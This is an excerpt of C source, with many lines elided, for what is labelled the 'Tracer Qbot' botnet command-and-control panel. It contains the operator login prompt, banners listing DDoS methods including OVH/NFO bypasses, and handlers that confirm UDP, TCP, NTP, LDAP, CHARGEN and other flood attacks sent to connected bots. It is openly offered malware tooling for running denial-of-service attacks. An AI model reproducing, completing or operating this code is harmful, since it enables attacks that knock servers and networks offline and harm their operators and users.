...
void *BotWorker(void *sock) {
    ...
    while(j!=i-1) {
		...
		sprintf(user, "\e[1;31mOfficial \e[1;36mTracer \e[1;31mQbot \e[1;36m> \e[1;31mUsername:\e[0m\e[30m: ");
...
void *TitleWriter(void *sock) {
    ...
    while(1) {
        ...
        sprintf(string, "%c]0; %d Tracer Servers Connnected || Official Tracer Qbot || DDoS With Raw Power   %c", '\033', BotsConnected(), '\007');
...
sprintf(ascii_banner_line11, "\e[1;31m       Tracer \e[1;36mOn \e[1;31mTop \e[1;36m[Coded By CodeWrititngs] \e[1;31m= \e[1;36mShy\r\n");
  ...
  if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
		...
		while(1) {
		char input [5000];
        sprintf(input, "\e[1;31mTracer\e[1;36m~# ");
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "ROOTS") || strstr(buf, "BOTS") || strstr(buf, "roots") || strstr(buf, "Roots") || strstr(buf, "Roats")) {
				...
				sprintf(ops,         "\e[90mTracer User's\e[1;31m:\e[90m [\e[0m%d\e[90m]\r\n", OperatorsConnected, scannerreport);
  ...
  sprintf(hp1,  "\e[1;31m ╔═════════════════╗             ╔═════════════════╗ \r\n");
  sprintf(hp2,  "\e[1;31m ║    \e[31mTracer      \e[1;31m║             ║\e[31mCCR: XXX-666-1337\e[1;31m║\r\n");
  sprintf(hp3,  "\e[1;31m ╚═════════════════╝      ║      ║\e[31mAPI:  \e[1;32mONLINE     \e[1;31m║\r\n");
  sprintf(hp4,  "\e[1;31m                          ║      ╚═════════════════╝\r\n");
  sprintf(hp5,  "\e[1;31m    ╔═════════════════════╩═════════════════════╗\r\n");
  sprintf(hp6,  "\e[1;31m    ║\e[31mMETHODS - Shows Home Connection Methods    \e[1;31m║\r\n");
  sprintf(hp7,  "\e[1;31m    ║\e[36mAPI     - Shows All API Methods            \e[1;31m║\r\n");
  sprintf(hp8,  "\e[1;36m    ║\e[31mIPHM    - Shows IP Header Methods          \e[1;36m║\r\n");
  sprintf(hp9, "\e[1;36m    ║\e[36mSPECIAL - Shows Special OVH/NFO Methods    \e[1;36m║\r\n");
  sprintf(hp10, "\e[1;36m    ║\e[31mPORTS   - Shows A List Of Ports            \e[1;36m║\r\n");
  sprintf(hp11, "\e[1;36m    ║\e[36mROOTS   - Shows Roots Count                \e[1;36m║\r\n");
  sprintf(hp12, "\e[1;36m    ║\e[31mSTATUS  - Shows Owners Social Media        \e[1;36m║\r\n");
  sprintf(hp13, "\e[1;36m    ╚═══════════════════════════════════════════╝\r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "rule") || strstr(buf, "RULE") || strstr(buf, "RULE") || strstr(buf, "rules") || strstr(buf, "RULES") || strstr(buf, "Rules")) {
                ...
                sprintf(p2,  "\e[\e[1;31m ║\e[31mCoded By:\e[1;36mClerisy     \e[1;33m║\e[1;31mRespect \e[1;36mOwners \e[1;33m║\r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "TICKET") || strstr(buf, "Ticket") || strstr(buf, "ticket")) {
                ...
                pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[31m%s\e[1;35m~\e[1;33mTracer\e[94m#\e[37m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
  ...
  sprintf(ls6,  "\e[1;36m ╚═════════════════════════════════════════════╝\r\n");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 		...
 		if(strstr(buf, "special") || strstr(buf, "SPECIAL") || strstr(buf, "Special")) {
                ...
                sprintf(ls2,  "\e[1;31m          ╔═════════════════════╗         \r\n");
                sprintf(ls3,  "\e[1;31m          ║     \e[1;32mTracer          \e[1;31m║         \r\n");
       ...
       sprintf(input, "\e[1;31mTracer\e[1;36m~# ");
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "!* UDP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mUDP \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TCP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mTCP \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NFO")) 
        {
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mNFO \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* SLAP-OVH")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mOVH Bypass [Server 1337] \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* VPN-NULL")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mVPN [Server 666] \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* OVH-KISS")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mOVH Bypass [From Tracer Api] \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NUKE")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mNUKE [From Tracer Api] \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* VSE")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mVSE \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* STDHEX")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mSTDHEX \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* JUNK")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mJUNK \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* HOLD")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mHOLD \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* KKK")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mKill Kaiten Kids \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* HYDRA")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mHydra Bypass [SecurityTeam API] \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* LDAP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mLDAP \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NTP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;31mNTP \x1b[1;36mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* CHARGEN")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mCHARGEN \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* RIP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mRIP [Tracer API] \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* ZAP")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;33m] Sending \x1b[1;31mZAP [Tracer API] \x1b[1;36mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* DEATH")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mDEATH [Tracer API] \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* KILLALL")) 
        {    
        sprintf(botnet, "\x1b[1;31m[\x1b[1;36mTracer\x1b[1;31m] Sending \x1b[1;36mKILLALL [Tracer API] \x1b[1;31mAttack\r\n");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
